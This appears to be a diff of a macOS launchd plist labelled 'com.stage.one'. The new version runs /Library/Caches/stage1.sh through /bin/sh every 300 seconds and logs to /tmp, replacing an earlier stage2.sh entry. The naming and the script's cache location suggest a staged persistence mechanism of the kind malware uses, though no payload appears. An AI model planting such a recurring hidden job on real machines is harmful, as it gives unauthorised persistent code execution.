@@ -9,37 +9,25 @@
     <key>Label</key>
 
     <string>com.stage.one</string>
-    
-    <key>Disabled</key>
-    
-    <false/>
-    
-    <key>KeepAlive</key>
-    
-    <dict>
 
     <key>ProgramArguments</key>
 
     <array>
 
-        <string>/Library/Caches/stage2.sh</string>
+        <string>/bin/sh</string>
+
+        <string>/Library/Caches/stage1.sh</string>
 
     </array>
-    
-    <key>OnDemand</key>
-    
-    <false/>
 
     <key>StartInterval</key>
 
     <integer>300</integer>
     
      <key>StandardErrorPath</key>
-    
         <string>/tmp/StageOne.err</string>
 
         <key>StandardOutPath</key>
-    
         <string>/tmp/StageOne.out</string>
 
 </dict>
